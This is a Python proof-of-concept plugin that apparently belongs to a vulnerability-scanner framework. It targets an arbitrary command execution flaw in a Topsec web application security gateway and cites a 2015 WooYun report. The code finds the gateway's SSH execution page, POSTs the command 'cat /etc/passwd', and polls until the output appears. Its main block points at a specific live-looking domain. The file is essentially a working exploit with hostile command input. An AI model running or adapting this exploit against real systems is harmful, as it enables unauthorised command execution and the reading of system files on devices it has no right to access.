#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 天融信WEB应用安全网关任意命令执行
refer: http://www.wooyun.org/bugs/wooyun-2015-0131155
description:
    访问https://foobar/function/ssh/file_ssh.php点执行命令
和尚不要打我....
'''

import re
import time

def assign(service, arg):
    if service == 'topsec':
        return True, arg

def audit(arg):
    url = arg + 'function/ssh/file_ssh.php'
    #不同网站id可能不同，默认id为1,若file_ssh.php无法访问，则尝试以默认id执行命令
    exec_id = 10;
    #获取执行命令页面id
    code, head, res, err, _ = curl.curl2(url)
    if code == 200:
        m = re.search(r'onclick="window\.open\(\'file_ssh_exec\.php\?action=user_query&id=([\d]*)\'\)" value="执行命令"', res)
        if m:
            exec_id = m.group(1)
    post = 'cmd=cat+%2Fetc%2Fpasswd&action=user_cmd_submit&id='+exec_id
    #执行命令
    exec_url = arg + 'function/ssh/file_ssh_exec.php'
    code, head, res, err, _ = curl.curl2(exec_url, post=post)
    if code != 200:
        return False
    #等待执行结果，最多等待50s
    result_id = False
    for i in range(5):
        #debug(str(i))
        time.sleep(10)
        code, head, res, err, _ = curl.curl2(arg + 'function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id='+exec_id)
        if (code == 200) and ('查看' in res):
            m = re.search(r'a href="file_ssh_result\.php\?cmd_id=([\d]*)"', res)
            if m:
                result_id = m.group(1)
                break
    if not result_id:
        return False
    #获取执行结果
    code, head, res, err, _ = curl.curl2(arg + 'function/ssh/file_ssh_result.php?cmd_id='+result_id)
    #print code, head, res, err
    if (code == 200) and 'root:' in res:
        security_hole('command execution: ' + arg + 'function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id='+exec_id)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec','https://www.njfyjf.com/')[1])
